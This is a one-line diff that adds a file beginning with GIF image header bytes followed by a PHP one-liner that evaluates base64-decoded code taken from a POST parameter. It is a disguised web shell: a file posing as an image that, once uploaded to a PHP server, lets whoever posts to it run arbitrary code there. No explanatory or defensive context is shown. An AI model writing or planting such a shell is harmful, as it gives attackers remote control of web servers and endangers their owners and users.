@@ -1,0 +1,1 @@
+GIF89a<?php @assert(base64_decode($_POST["a"]));?>
